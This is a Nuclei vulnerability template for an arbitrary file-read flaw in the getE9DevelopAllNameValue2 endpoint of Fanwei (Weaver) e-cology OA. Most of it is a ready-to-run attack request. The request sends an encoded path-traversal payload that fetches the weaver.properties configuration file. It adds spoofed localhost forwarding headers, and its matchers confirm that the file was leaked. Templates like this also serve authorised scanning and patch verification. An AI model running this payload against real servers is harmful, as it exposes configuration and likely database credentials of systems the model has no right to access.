id: fanweiOA-getE9DevelopAllNameValue2-read-file

info:
  name: 泛微getE9DevelopAllNameValue2接口存在任意文件读取漏洞
  author: cnaq
  severity: high  
  description: 泛微getE9DevelopAllNameValue2接口存在任意文件读取漏洞
  reference: 
    - https://github.com/wy876/POC/blob/main/%E6%B3%9B%E5%BE%AEgetE9DevelopAllNameValue2%E6%8E%A5%E5%8F%A3%E5%AD%98%E5%9C%A8%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%E6%BC%8F%E6%B4%9E.md
  tags: lfi,ecology,fanwei,oa


requests:
  - raw:
      - |
        GET /api/portalTsLogin/utils/getE9DevelopAllNameValue2?fileName=portaldev_%2f%2e%2e%2fweaver%2eproperties HTTP/1.1
        Host: {{Hostname}}
        User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/109.0
        Accept: */*
        Connection: Keep-Alive
        X-Forwarded-For: 127.0.0.1
        X-Originating: 127.0.0.1
        X-Remote-IP: 127.0.0.1
        X-Remote-Addr: 127.0.0.1

    matchers-condition: and  
    matchers:
      # 漏洞返回页面无特征，使用过滤方式减少误报
      # 基本条件1 响应状态
      - type: status
        status:
          - 200
      # 高级条件 内容必有的单字符
      - type: word
        part: body
        words:
          - 'data'
          - 'ecology.url'
        condition: and

